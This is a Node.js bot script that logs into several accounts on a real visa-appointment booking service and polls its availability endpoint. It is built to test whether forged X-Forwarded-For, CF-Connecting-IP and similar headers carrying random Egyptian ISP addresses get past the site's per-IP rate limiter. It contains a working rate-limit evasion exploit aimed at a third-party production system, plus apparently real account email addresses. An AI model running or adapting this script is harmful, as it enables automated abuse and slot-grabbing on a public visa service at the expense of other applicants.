// 4-account x 10-min SPOOF test via Burp: does X-Forwarded-For spoof bypass the real-IP limiter?
// - enables 4 fresh disabled test accounts (restores flags at end, even on error)
// - staggered logins, stable per-account Egyptian spoof IP on every /checks request
// - smart spacing: each account every 3300ms, accounts staggered 825ms apart
// - stops an account on its first 429 (records request #), others continue
// - all traffic flows through Burp MITM (127.0.0.1:8080) for inspection
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
const fs = require('fs');
const https = require('https');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');

const DIR = 'D:\\botbot\\WATCH DOGS TEAM';
const ACCOUNTS_FILE = path.join(DIR, 'accounts.json');
const LOG_FILE = path.join(DIR, 'bot-session-logs', 'spoof-4acct-10min.txt');
const agent = new HttpsProxyAgent('http://127.0.0.1:8080', { rejectUnauthorized: false, timeout: 30000 });
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
const EGYPT_ISP_RANGES = [
  { prefix: [41, 32], maxSecond: 47 }, { prefix: [41, 64], maxSecond: 79 },
  { prefix: [197, 32], maxSecond: 39 }, { prefix: [102, 40], maxSecond: 47 },
  { prefix: [41, 36], maxSecond: 39 },
];
const VISA_IDS = { 'Tourism Visa': 1, 'Tourism Visa (C)': 1, 'Business Visa': 5, 'Business Visa (C)': 5, 'Sport Visa': 10, 'Sport Visa (C)': 10, 'Study Visa (C)': 9, 'Study Visa (D)': 8, 'Medical Visa': 15, 'Re-entry Visa (D)': 4, 'Employment (record number 2025)': 31, 'Employment (record number 2026)': 32, 'Family Reunion': 19, 'Research': 33 };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const ts = () => new Date().toTimeString().slice(0, 8) + '.' + String(new Date().getMilliseconds()).padStart(3, '0');
function log(line) { const l = `[${ts()}] ${line}`; fs.appendFileSync(LOG_FILE, l + '\n'); console.log(l); }
function pickIspIP() {
  const r = EGYPT_ISP_RANGES[Math.floor(Math.random() * EGYPT_ISP_RANGES.length)];
  const second = r.prefix[1] + Math.floor(Math.random() * (r.maxSecond - r.prefix[1] + 1));
  return `${r.prefix[0]}.${second}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}
function req(url, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const t0 = Date.now();
    const r = https.request(url, { method, agent, headers, timeout: 30000 }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, ms: Date.now() - t0, body: Buffer.concat(chunks).toString('utf8') }));
    });
    r.on('timeout', () => r.destroy(new Error('timeout')));
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

const DURATION_MS = 10 * 60 * 1000;
const PER_ACCOUNT_MS = 3300;   // smart cycleTime for these settings
const STAGGER_MS = 825;        // inter-account gap (4 accounts)
const CANDIDATES = ['lorenabdelshahid@outlook.com', 'lyalshh866@gmail.com', 'madounagirgis@outlook.com', 'mahmoud.0505p@gmail.com', 'mahmoud300739@gmail.com', 'mahmoud_saleh2025@outlook.com'];

(async () => {
  fs.writeFileSync(LOG_FILE, `=== spoof 4-acct 10-min test started ${new Date().toISOString()} ===\n`);
  const accs = JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8'));
  const byEmail = new Map(accs.map((a) => [String(a.email).toLowerCase(), a]));
  const originalFlags = new Map();

  // login with fallback over candidates until 4 succeed
  const active = [];
  for (const email of CANDIDATES) {
    if (active.length >= 4) break;
    const acc = byEmail.get(email);
    if (!acc) continue;
    try {
      const body = new URLSearchParams({ grant_type: 'password', client_id: 'aa-visasys-public', username: acc.email, password: acc.password, scope: 'openid profile email' }).toString();
      const login = await req('https://egyiam.almaviva-visa.it/realms/oauth2-visaSystem-realm-pkce/protocol/openid-connect/token',
        { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, Accept: 'application/json', 'Content-Length': Buffer.byteLength(body) }, body });
      if (login.status !== 200) { log(`login FAIL ${acc.email} status=${login.status} ${login.body.slice(0, 100)}`); continue; }
      const tok = JSON.parse(login.body).access_token;
      const visaType = (acc.enabledVisaTypes && acc.enabledVisaTypes[0]) || 'Tourism Visa (C)';
      const visaId = VISA_IDS[visaType] || 1;
      const officeId = acc.office === 'Alexandria' ? 2 : 1;
      const spoofIP = pickIspIP();
      active.push({ acc, token: tok, visaType, visaId, officeId, spoofIP, fires: 0, ok200: 0, r429: 0, other: 0, dead: false, deathAt: null });
      log(`login OK ${acc.email} | visa=${visaType}(${visaId}) office=${officeId} | spoofIP=${spoofIP} | ${login.ms}ms`);
      await sleep(1000);
    } catch (e) { log(`login ERR ${email}: ${String(e.message).slice(0, 100)}`); }
  }
  if (active.length < 4) { log(`ABORT: only ${active.length}/4 logins succeeded`); process.exit(2); }

  // enable the 4 test accounts (restore at end)
  for (const s of active) { originalFlags.set(s.acc.email, s.acc.enabled); s.acc.enabled = true; }
  fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accs, null, 2));
  log(`enabled 4 test accounts (flags will be restored at end)`);

  const restore = () => {
    try {
      const cur = JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8'));
      for (const c of cur) { if (originalFlags.has(c.email)) c.enabled = originalFlags.get(c.email); }
      fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(cur, null, 2));
      log('account enabled-flags restored');
    } catch (e) { log('RESTORE FAILED: ' + e.message); }
  };
  process.on('SIGINT', () => { restore(); process.exit(130); });

  const tStart = Date.now();
  const fireOne = async (s, seq) => {
    const url = `https://egyapi.almaviva-visa.it/reservation-manager/api/planning/v1/checks?officeId=${s.officeId}&visaId=${s.visaId}&serviceLevelId=1`;
    let status = -1, ms = 0, body = '';
    try {
      const res = await req(url, { headers: {
        Authorization: 'Bearer ' + s.token, Accept: 'application/json, text/plain, */*', 'User-Agent': UA,
        'Accept-Language': 'en', Origin: 'https://egy.almaviva-visa.it', Referer: 'https://egy.almaviva-visa.it/',
        'X-Forwarded-For': s.spoofIP, 'X-Real-IP': s.spoofIP, 'Client-IP': s.spoofIP,
        'True-Client-IP': s.spoofIP, 'CF-Connecting-IP': s.spoofIP, Forwarded: `for=${s.spoofIP};proto=https`,
      }});
      status = res.status; ms = res.ms; body = res.body.slice(0, 100);
    } catch (e) { body = 'ERR:' + String(e.message).slice(0, 80); }
    s.fires++;
    if (status === 200) s.ok200++;
    else if (status === 429) { s.r429++; s.dead = true; s.deathAt = seq; }
    else s.other++;
    return { status, ms, body };
  };

  log(`firing: 4 accounts x every ${PER_ACCOUNT_MS}ms, staggered ${STAGGER_MS}ms, for 10 min`);
  let seq = 0;
  let lastMinute = -1;
  while (Date.now() - tStart < DURATION_MS) {
    if (!active.some((s) => !s.dead)) { log('ALL ACCOUNTS DEAD — stopping early'); break; }
    const waveStart = Date.now();
    for (let i = 0; i < active.length; i++) {
      const s = active[i];
      if (s.dead) continue;
      const wait = waveStart + i * STAGGER_MS - Date.now();
      if (wait > 0) await sleep(wait);
      if (Date.now() - tStart >= DURATION_MS) break;
      seq++;
      const r = await fireOne(s, s.fires + 1);
      if (r.status === 429) log(`☠️ 429 DEATH ${s.acc.email} at its request #${s.deathAt} (spoof ${s.spoofIP}) t=${Math.round((Date.now() - tStart) / 1000)}s`);
      else if (r.status !== 200) log(`note ${s.acc.email} #${s.fires} status=${r.status} ${r.body.slice(0, 80)}`);
    }
    const minute = Math.floor((Date.now() - tStart) / 60000);
    if (minute !== lastMinute) {
      lastMinute = minute;
      log(`--- t=${minute}m alive=${active.filter((s) => !s.dead).length}/4 ` + active.map((s) => `${s.acc.email.split('@')[0]}:${s.fires}${s.dead ? '(DEAD@' + s.deathAt + ')' : ''}`).join(' '));
    }
    const waveElapsed = Date.now() - waveStart;
    const cycleWait = PER_ACCOUNT_MS - active.length * STAGGER_MS - waveElapsed;
    if (cycleWait > 0) await sleep(Math.min(cycleWait, DURATION_MS - (Date.now() - tStart)));
  }

  log('=== FINAL ===');
  let total = 0;
  for (const s of active) {
    total += s.fires;
    log(`${s.dead ? '☠️' : '✅'} ${s.acc.email} | spoof=${s.spoofIP} | fires=${s.fires} ok200=${s.ok200} 429=${s.r429} other=${s.other}${s.deathAt ? ' deathAt#' + s.deathAt : ''}`);
  }
  log(`TOTAL requests from one real IP in ${Math.round((Date.now() - tStart) / 1000)}s: ${total} | alive=${active.filter((s) => !s.dead).length}/4`);
  log(JSON.stringify({ summary: true, accounts: active.map((s) => ({ email: s.acc.email, spoofIP: s.spoofIP, fires: s.fires, ok200: s.ok200, r429: s.r429, deathAt: s.deathAt })) }));
  restore();
})().catch((e) => { try { log('FATAL ' + (e.stack || e.message)); } catch (_) {} process.exit(1); });
